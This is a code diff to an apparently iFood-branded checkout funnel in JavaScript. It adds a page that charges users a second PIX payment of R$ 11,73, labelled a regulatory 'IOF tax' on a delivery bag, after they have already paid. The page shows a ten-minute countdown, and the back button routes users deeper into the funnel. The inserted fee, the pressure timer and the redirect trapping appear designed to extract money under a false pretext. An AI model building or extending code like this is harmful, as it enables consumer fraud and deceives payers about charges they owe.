@@ -173,6 +173,9 @@ document.addEventListener('DOMContentLoaded', () => {
         case 'pix':
             initPix();
             break;
+        case 'upsell-iof':
+            initUpsellIof();
+            break;
         case 'upsell':
             initUpsell();
             break;
@@ -667,7 +670,7 @@ function getBackRedirectOffer(page, level = 1) {
             amountOff: 5
         };
     }
-    if (page === 'upsell') {
+    if (page === 'upsell' || page === 'upsell-iof') {
         return {
             mode: 'coupon',
             badge: 'Desconto exclusivo',
@@ -2281,6 +2284,125 @@ function initOrderBump() {
     btnDecline?.addEventListener('click', () => proceedToPix(false));
 }
 
+function initUpsellIof() {
+    if (!requirePersonal()) return;
+    if (!requireAddress()) return;
+
+    setStage('upsell_iof');
+    const personal = loadPersonal();
+    const shippingStored = loadShipping();
+    const shipping = isShippingSelectionComplete(shippingStored) ? shippingStored : null;
+    const pix = loadPix();
+    const offerPrice = 11.73;
+
+    trackLead('upsell_iof_view', { stage: 'upsell_iof', shipping, pix, offerPrice });
+
+    const leadName = document.getElementById('upsell-iof-lead-name');
+    const currentFrete = document.getElementById('upsell-iof-current-frete');
+    const currentTxid = document.getElementById('upsell-iof-current-txid');
+    const btnAccept = document.getElementById('btn-upsell-iof-accept');
+    const btnSkip = document.getElementById('btn-upsell-iof-skip');
+    const loading = document.getElementById('upsell-iof-loading');
+    const timerLabel = document.getElementById('upsell-iof-timer');
+    const iofPriceLabel = document.getElementById('upsell-iof-price');
+
+    if (leadName && personal?.name) {
+        const firstName = String(personal.name || '').trim().split(/\s+/)[0];
+        leadName.textContent = firstName || 'Parceiro';
+    }
+    if (currentFrete) {
+        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+    }
+    if (currentTxid) {
+        const txid = String(pix?.idTransaction || '').trim();
+        currentTxid.textContent = txid ? txid.slice(-8) : '--';
+    }
+    if (iofPriceLabel) {
+        iofPriceLabel.textContent = formatCurrency(offerPrice);
+    }
+
+    const setLoading = (active) => {
+        if (btnAccept) btnAccept.disabled = active;
+        if (btnSkip) btnSkip.disabled = active;
+        if (loading) loading.classList.toggle('hidden', !active);
+    };
+
+    const startCountdown = () => {
+        if (!timerLabel) return;
+        const storageKey = 'ifood_upsell_iof_deadline_ts';
+        const now = Date.now();
+        const fallbackDeadline = now + (10 * 60 * 1000);
+        const savedRaw = Number(sessionStorage.getItem(storageKey) || 0);
+        const deadline = savedRaw > now ? savedRaw : fallbackDeadline;
+        sessionStorage.setItem(storageKey, String(deadline));
+
+        const render = () => {
+            const diff = Math.max(0, deadline - Date.now());
+            const totalSeconds = Math.floor(diff / 1000);
+            const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
+            const ss = String(totalSeconds % 60).padStart(2, '0');
+            timerLabel.textContent = `${mm}:${ss}`;
+            return diff > 0;
+        };
+
+        render();
+        const interval = window.setInterval(() => {
+            const keep = render();
+            if (!keep) window.clearInterval(interval);
+        }, 1000);
+    };
+
+    const goToSecondUpsell = () => {
+        setStage('upsell');
+        redirect('upsell.html');
+    };
+
+    startCountdown();
+
+    btnAccept?.addEventListener('click', async () => {
+        const iofShipping = {
+            id: 'taxa_iof_bag',
+            name: 'Taxa regulatoria IOF da BAG',
+            eta: 'Regularizacao imediata',
+            price: offerPrice
+        };
+
+        setLoading(true);
+        trackLead('upsell_iof_accept', {
+            stage: 'upsell_iof',
+            shipping: iofShipping,
+            baseShipping: shipping || null,
+            previousPix: pix || null,
+            amount: offerPrice
+        });
+
+        try {
+            btnAccept.textContent = 'Gerando PIX da taxa de IOF...';
+            await createPixCharge(iofShipping, 0, {
+                sourceStage: 'upsell_iof',
+                upsell: {
+                    enabled: true,
+                    kind: 'taxa_iof_bag',
+                    title: 'Taxa de IOF da BAG',
+                    price: offerPrice,
+                    previousTxid: String(pix?.idTransaction || '').trim(),
+                    targetAfterPaid: 'upsell.html'
+                }
+            });
+        } catch (error) {
+            btnAccept.textContent = 'Pagar taxa de IOF de R$ 11,73';
+            showToast(error.message || 'Nao foi possivel gerar o PIX da taxa de IOF.', 'error');
+            setLoading(false);
+        }
+    });
+
+    btnSkip?.addEventListener('click', () => {
+        trackLead('upsell_iof_decline', { stage: 'upsell_iof', shipping, pix, amount: offerPrice });
+        showToast('Sem problemas. Vamos para o proximo passo.', 'info');
+        goToSecondUpsell();
+    });
+}
+
 function initUpsell() {
     if (!requirePersonal()) return;
     if (!requireAddress()) return;
@@ -2413,7 +2535,8 @@ function initUpsell() {
                     kind: 'frete_1dia',
                     title: 'Prioridade de envio',
                     price: offerPrice,
-                    previousTxid: String(pix?.idTransaction || '').trim()
+                    previousTxid: String(pix?.idTransaction || '').trim(),
+                    targetAfterPaid: 'upsell.html?paid=1'
                 }
             });
         } catch (error) {
@@ -2575,6 +2698,16 @@ function initPix() {
         String(pix?.shippingId || '').trim() === 'expresso_1dia' ||
         /adiantamento|prioridade|expresso/i.test(String(pix?.shippingName || ''))
     );
+    const upsellKind = String(pix?.upsell?.kind || '').trim().toLowerCase();
+    const upsellTargetAfterPaid = String(pix?.upsell?.targetAfterPaid || '').trim();
+    const isIofUpsellPix = Boolean(
+        isUpsellPix && (
+            /iof/.test(upsellKind) ||
+            /iof/.test(String(pix?.shippingId || '').toLowerCase()) ||
+            /iof/.test(String(pix?.shippingName || '').toLowerCase()) ||
+            /iof/.test(String(pix?.upsell?.title || '').toLowerCase())
+        )
+    );
 
     let statusPollTimer = null;
     let pollingBusy = false;
@@ -2587,6 +2720,19 @@ function initPix() {
             clearInterval(statusPollTimer);
             statusPollTimer = null;
         }
+    };
+
+    const resolveUpsellPaidRedirect = () => {
+        if (upsellTargetAfterPaid) return upsellTargetAfterPaid;
+        return isIofUpsellPix ? 'upsell.html' : 'upsell.html?paid=1';
+    };
+
+    const resolveStageFromRedirect = (targetUrl) => {
+        const normalized = String(targetUrl || '').trim().toLowerCase();
+        if (!normalized) return 'upsell';
+        if (normalized.includes('upsell-iof')) return 'upsell_iof';
+        if (normalized.includes('upsell')) return 'upsell';
+        return 'checkout';
     };
 
     const markPaidAndRedirect = (statusRaw) => {
@@ -2619,7 +2765,9 @@ function initPix() {
         }
 
         if (isUpsellPix) {
-            trackLead('upsell_pix_paid_redirect', {
+            const paidTarget = resolveUpsellPaidRedirect();
+            const targetStage = resolveStageFromRedirect(paidTarget);
+            trackLead(isIofUpsellPix ? 'upsell_iof_pix_paid_redirect' : 'upsell_pix_paid_redirect', {
                 stage: 'pix',
                 shipping,
                 pix: {
@@ -2627,15 +2775,20 @@ function initPix() {
                     statusRaw: String(statusRaw || 'paid')
                 }
             });
-            showToast('Pagamento confirmado. Prioridade ativada.', 'success');
-            setStage('upsell');
+            showToast(
+                isIofUpsellPix
+                    ? 'Pagamento confirmado. Seguindo para o proximo beneficio.'
+                    : 'Pagamento confirmado. Prioridade ativada.',
+                'success'
+            );
+            setStage(targetStage);
             setTimeout(() => {
-                redirect('upsell.html?paid=1');
+                redirect(paidTarget);
             }, 900);
             return;
         }
 
-        trackLead('pix_paid_redirect_upsell', {
+        trackLead('pix_paid_redirect_upsell_iof', {
             stage: 'pix',
             shipping,
             pix: {
@@ -2643,10 +2796,10 @@ function initPix() {
                 statusRaw: String(statusRaw || 'paid')
             }
         });
-        showToast('Pagamento confirmado. Redirecionando...', 'success');
-        setStage('upsell');
+        showToast('Pagamento confirmado. Vamos liberar sua taxa de IOF.', 'success');
+        setStage('upsell_iof');
         setTimeout(() => {
-            redirect('upsell.html');
+            redirect('upsell-iof.html');
         }, 900);
     };
 
@@ -2765,6 +2918,27 @@ function toRootRelativePath(rawUrl = '') {
     return normalized.startsWith('/') ? normalized : `/${normalized}`;
 }
 
+function resolvePaidPixTarget(pix) {
+    const pixData = pix && typeof pix === 'object' ? pix : null;
+    if (!pixData || !isPixPaid(pixData)) return '';
+
+    const explicitTarget = String(pixData?.upsell?.targetAfterPaid || '').trim();
+    if (explicitTarget) return explicitTarget;
+
+    const isUpsellPix = Boolean(pixData?.isUpsell || pixData?.upsell?.enabled);
+    if (!isUpsellPix) return 'upsell-iof.html';
+
+    const kind = String(pixData?.upsell?.kind || '').trim().toLowerCase();
+    const hints = [
+        String(pixData?.shippingId || '').trim().toLowerCase(),
+        String(pixData?.shippingName || '').trim().toLowerCase(),
+        String(pixData?.upsell?.title || '').trim().toLowerCase()
+    ].join(' ');
+    if (/iof/.test(kind) || /iof/.test(hints)) return 'upsell.html';
+
+    return 'upsell.html?paid=1';
+}
+
 function buildBackRedirectUrl(pageOverride) {
     const params = new URLSearchParams(window.location.search || '');
     const withDirectMode = (basePath) => {
@@ -2812,7 +2986,7 @@ function buildBackRedirectUrl(pageOverride) {
         return 'pix.html';
     }
     if (pixPaid) {
-        return 'upsell.html';
+        return resolvePaidPixTarget(pix) || 'upsell-iof.html';
     }
 
     switch (page) {
@@ -2837,6 +3011,8 @@ function buildBackRedirectUrl(pageOverride) {
             return directCheckoutUrl();
         case 'pix':
             return pixPending ? 'pix.html' : directCheckoutUrl();
+        case 'upsell-iof':
+            return 'upsell-iof.html';
         case 'upsell':
             return 'upsell.html';
         default:
@@ -2896,6 +3072,10 @@ function buildBackRedirectFallbackUrl(pageOverride) {
             return withParams('checkout.html', (qp) => {
                 qp.set('dc', '1');
                 qp.set('forceFrete', '1');
+                qp.set('br', String(Date.now()));
+            });
+        case 'upsell-iof':
+            return withParams('pix.html', (qp) => {
                 qp.set('br', String(Date.now()));
             });
         case 'upsell':
@@ -3060,7 +3240,8 @@ function initAdmin() {
         checkout: { label: 'checkout.html', desc: 'Endereco e selecao de frete' },
         orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
         pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
-        upsell: { label: 'upsell.html', desc: 'Oferta de adiantamento de entrega' }
+        'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de IOF da bag' },
+        upsell: { label: 'upsell.html', desc: 'Upsell 2: prioridade de envio' }
     };
     let currentSettings = null;
 
@@ -3785,7 +3966,7 @@ function initAdmin() {
         });
 
         if (pagesInsights) {
-            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix', 'upsell'];
+            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix', 'upsell-iof', 'upsell'];
             const map = new Map(rows.map((r) => [r.page, Number(r.total) || 0]));
             pagesInsights.innerHTML = '';
             let prevEffective = null;
@@ -4571,7 +4752,8 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
                 kind: String(options?.upsell?.kind || 'frete_1dia'),
                 title: String(options?.upsell?.title || 'Prioridade de envio'),
                 price: Number(options?.upsell?.price || extraCharge || shippingPrice || 0),
-                previousTxid: String(options?.upsell?.previousTxid || '')
+                previousTxid: String(options?.upsell?.previousTxid || ''),
+                targetAfterPaid: String(options?.upsell?.targetAfterPaid || '')
             } : null
         };
 
@@ -4579,7 +4761,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
         if (!res.ok) {
             const message = normalizeApiErrorMessage(data?.error || '') || 'Falha ao gerar o PIX. Tente novamente em instantes.';
             trackLead(isUpsell ? 'upsell_pix_create_failed' : 'pix_create_failed', {
-                stage: isUpsell ? 'upsell' : 'orderbump',
+                stage: isUpsell ? (String(options?.sourceStage || '').trim() || 'upsell') : 'orderbump',
                 shipping: shippingForPix,
                 bump: payload.bump,
                 amount
@@ -4890,6 +5072,21 @@ function maybeTrackPixel(eventName, payload = {}) {
         });
     }
 
+    if (eventName === 'upsell_iof_view' && pixel.events?.checkout !== false) {
+        firePixelEvent('ViewContent', {
+            content_name: 'upsell_taxa_iof_bag',
+            content_category: 'upsell'
+        });
+    }
+
+    if (eventName === 'upsell_iof_accept' && pixel.events?.checkout !== false) {
+        firePixelEvent('AddToCart', {
+            content_name: 'upsell_taxa_iof_bag',
+            currency: 'BRL',
+            value: totalValue > 0 ? totalValue : 11.73
+        });
+    }
+
     if ((eventName === 'pix_created_front' || eventName === 'upsell_pix_created_front') && pixel.events?.checkout !== false) {
         firePixelEvent('AddPaymentInfo', {
             currency: 'BRL',
@@ -5111,6 +5308,7 @@ function resolveResumeUrl() {
     if (stage === 'checkout') return 'checkout';
     if (stage === 'orderbump') return 'orderbump';
     if (stage === 'pix') return 'pix';
+    if (stage === 'upsell_iof') return 'upsell-iof';
     if (stage === 'upsell') return 'upsell';
     if (stage === 'complete') return 'checkout';
     if (loadPersonal() && !loadAddress()) return 'endereco';
